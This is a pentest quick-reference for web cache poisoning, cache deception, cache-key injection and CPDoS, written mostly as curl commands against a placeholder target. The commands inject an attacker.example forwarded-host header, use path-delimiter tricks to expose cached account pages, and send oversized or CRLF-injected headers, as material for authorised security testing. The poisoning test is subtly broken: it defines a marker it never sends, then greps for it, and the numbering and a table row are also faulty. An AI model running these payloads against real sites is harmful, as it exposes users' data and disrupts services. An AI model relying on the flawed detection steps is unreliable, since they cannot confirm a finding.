# Cache Poisoning & Deception — Quick Reference

> Quick reference for cache vulnerabilities. Full methodology in `web/vuln-classes/references/cache-poisoning.md`.
> All HTTP traffic via Caido proxy (`-x "http://localhost:8080"`).

---

## Quick Detection (via Caido)

```bash
# 1. Identify cache layers
curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/" | \
  grep -iE 'age:|x-cache:|cf-cache-status:|x-cache-status:|x-varnish:|via:|x-cache-hits:|server-timing:'

# 2. Baseline recording
curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/endpoint" > baseline.txt

# 3. Repeat to check cache behavior
for i in {1..3}; do
  curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/endpoint" | \
    grep -iE 'age:|x-cache:|cf-cache-status:'
done
```

---

## WCP Detection (Unkeyed Input)

```bash
# 1. Baseline
curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/endpoint" > baseline.txt

# 2. Inject unique marker
MARKER="CACHE_TEST_$(date +%s%N)"
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "X-Forwarded-Host: attacker.example" \
  "https://target.com/endpoint" > test.txt

# 3. Check if marker reflected in response
grep -i "CACHE_TEST" test.txt

# 5. Clean request to same key → returns modified content?
curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/endpoint" > clean.txt
grep -i "CACHE_TEST" clean.txt  # If found → POISONING CONFIRMED
```

---

## WCD Detection

```bash
# 1. Authenticated baseline (your test account)
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Cookie: session=YOUR_SESSION" \
  "https://target.com/account" > auth_baseline.txt

# 2. Test static extensions
for ext in .css .js .jpg .png .svg .ico .woff .woff2; do
  echo "Testing /account${ext}"
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    -H "Cookie: session=YOUR_SESSION" \
    "https://target.com/account${ext}" | \
    grep -iE 'content-type:|x-cache:|cf-cache-status:|age:'
done

# 3. Path delimiters
for path in "/account;.css" "/account%3b.css" "/account%00.css" "/account%3f.css"; do
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    -H "Cookie: session=YOUR_SESSION" \
    "https://target.com/account${path}" | \
    grep -iE 'content-type:|x-cache:|cf-cache-status:'
done

# 4. Unauthenticated retrieval
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/account/profile.css" | \
  grep -iE 'content-type:|x-cache:|cf-cache-status:|age:'
```

---

## Cache-Key Injection

```bash
# Nginx underscore collision
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/home_en?lang=en"

curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/home?lang=en_en"

# Query string canonicalization collision
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/search?q=budget&rows=10"

curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/search?q=budget%26rows%3d10"
```

---

## CPDoS Testing

```bash
# HPO - HTTP Header Oversize
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "X-Large-Header: $(python3 -c 'print("A"*5000)')" \
  "https://target.com/"

# HMC - HTTP Meta Character
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "X-Test: value\r\ninjected" \
  "https://target.com/"

# HMO - HTTP Method Override
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -X POST -H "X-HTTP-Method-Override: GET" \
  "https://target.com/api/resource"
```

---

## WCVS + Param Miner Automation

```bash
# WCVS comprehensive scan
docker run --rm -v $(pwd):/data hackmanit/wcvs \
  -t "https://target.com" \
  -p "http://localhost:8080" \
  --crawl \
  --unkeyed-headers \
  --unkeyed-params \
  --fat-get \
  --method-override \
  --path-traversal \
  --static-extension \
  --normalized-path \
  --cors \
  --param-cloaking \
  --cache-key-injection \
  -o wcvs_report.json

# Param Miner (Burp Suite):
# 1. Install from BApp Store
# 2. Right-click request → Extensions → Param Miner → Guess headers/params
# 3. Check "Unkeyed inputs" tab
```

---

## Verification Sequence (Mandatory)

```bash
# WCP:
# 1. Baseline request
# 2. Modified request with unique marker
# 3. Origin response changed?
# 4. Input absent from cache key?
# 5. Clean request to same key → returns modified content?
# 6. Clean request HIT or rising Age?
# 7. Cross-session validation (different session/unauthenticated)

# WCD:
# 1. Authenticated baseline (your test account)
# 2. Deceptive URL → origin returns sensitive data?
# 3. Cache stores it (HIT on repeat or clean request)?
# 4. Unauthenticated request to deceptive URL → returns sensitive data?

# Cache-Key Injection:
# 1. Two distinct raw requests
# 2. Same cache identity (HIT, rising Age, identical body)
# 3. Different origin responses (bypass cache)
# 4. Clean retrieval proves collision
```

---

## Chain Escalation

| Finding | Chain | Severity |
|---------|-------|----------|
| WCP → Stored XSS | Unkeyed input reflects in HTML/JS | Critical |
| WCP → Open Redirect | Unkeyed input in Location header | High |
| WCD → Sensitive Data Exposure | Authenticated data cached as static | High |
| WCD → CSRF Token Exposure | Cached page contains CSRF token | Medium |
| Cache-Key Injection → ACL Bypass | Public key collides with privileged | Critical |
| CPDoS | Error cached under benign key | High |
| Cache-Key Injection → Stored XSS | Scheme confusion → stored XSS | Critical |
| WCD → CSRF Token Exposure | Cached page contains token | Medium |

---

## False Positive Elimination

| Observation | Why Not Vulnerable | Required Validation |
|-------------|-------------------|---------------------|
| Reflected header | Not stored/retrieved | Clean retrieval proof |
| Cache HIT | No modification | Marker in clean response |
| Age > 0 | No poisoning | Marker in clean response |
| Wildcard Cache-Control | No poisoning | Clean retrieval with marker |
| Body difference | Different cache keys | Same key proof (HIT, Age) |
| Scanner result | No manual verification | Manual clean retrieval |

---

## Caido Integration

```bash
# All tools via Caido proxy
curl -x "http://localhost:8080" ...
# WCVS via Caido
docker run --rm -v $(pwd):/data hackmanit/wcvs \
  -t "https://target.com" \
  -p "http://localhost:8080" \
  ...
# Burp Suite → configure upstream proxy to http://localhost:8080
```

---

## Full Methodology

See `web/vuln-classes/references/cache-poisoning.md` for complete methodology including:
- Cache key reconstruction
- Normalization testing
- Serialization collisions
- API/GraphQL/CORS cache analysis
- CPDoS (HPO/HMC/HMO)
- Impact chains (WCP→XSS, WCD→data exposure, CKI→ACL bypass)
- Reporting templates and remediation